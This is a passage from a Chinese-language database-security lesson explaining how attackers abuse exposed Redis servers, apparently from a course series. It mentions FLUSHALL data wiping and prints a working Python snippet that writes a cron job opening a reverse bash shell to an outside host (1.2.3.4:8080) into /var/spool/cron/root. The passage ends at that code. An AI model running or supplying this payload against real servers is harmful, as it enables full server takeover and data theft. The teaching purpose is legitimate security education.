# 16 \| 数据库安全：数据库中的数据是如何被黑客拖取的？你好，我是何为舟。说到数据库，你肯定会说："数据库是我最熟悉的工具了。利用它，我能够设计复杂的表结构、写出炫酷的SQL语句、优化高并发场景下的读写性能。"当然，我们的日常工作离不开数据库的使用。而且，数据库中储存的大量机密信息，对于公司和用户都至关重要。那关于数据库的安全你知道多少呢？你知道数据库是如何进行认证的吗？使用数据库交换数据的过程是安全的吗？假如黑客连入了数据库，又会发生什么呢？今天，我就以两种比较常见的数据库 Redis 和 MySQL为例，来和你一起探讨数据库的安全。Redis 安全我们首先来看 Redis。我们都知道，Redis 是一个高性能的 KV结构的数据库。Redis的设计初衷是在可信的环境中，提供高性能的数据库服务。因此，Redis在设计上没有过多地考虑安全性，甚至可以说它刻意地牺牲了一定的安全性，来获取更高的性能。那在安全性不高的情况下，黑客连入 Redis能做什么呢？最直接的，黑客能够任意修改 Redis中的数据。比如，通过一个简单 FLUSHALL 命令，黑客就能够清空整个 Redis的数据了。 复杂一些的，黑客还可以发起权限提升，通过 Redis在服务器上执行命令，从而控制整个服务器。但是，Redis本身不提供执行命令的功能，那么黑客是如何让 Redis执行命令的呢？我们一起来看一下具体的代码流程。    r = redis.Redis(host=10.0.0.1, port=6379, db=0, socket_timeout=10)    payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/1.2.3.4/8080 0>&1\n\n'    path = '/var/spool/cron'    name = 'root'    key = 'payload'    r.set(key, payload)    r.config_set('dir', path)    r.config_set('dbfilename', name)    r.save()    r.delete(key)  